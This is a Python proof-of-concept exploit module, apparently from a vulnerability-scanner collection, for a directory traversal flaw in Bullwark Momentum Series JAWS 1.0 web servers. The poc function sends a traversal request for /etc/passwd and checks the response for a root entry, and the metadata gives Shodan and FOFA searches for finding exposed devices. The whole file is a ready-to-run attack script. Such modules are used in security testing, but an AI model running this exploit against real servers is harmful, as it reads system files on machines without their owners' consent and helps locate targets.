import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Bullwark Momentum Series JAWS 1.0 - Directory Traversal''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/47773", 
            "http://www.bullwark.net/", 
            "http://www.bullwark.net/Kategoriler.aspx?KategoriID=24"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            "version":'''Bullwark Momentum Series Web Server JAWS/1.0''',
            "shodan-query":'''https://www.shodan.io/search?query=Bullwark&page=1''',
            "fofa-query":'''https://fofa.so/result?q=Bullwark&qbase64=QnVsbHdhcms%3D'''
        },
        "tags": ["bullwark", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/../../../../../../../../../../../../../etc/passwd"""
        method = "GET"
        data = """"""
        headers = {'X-Requested-With': 'XMLHttpRequest', 'Referer': '{{Hostname}}'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and (re.search(r"""root:.*:0:0""",resp0.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url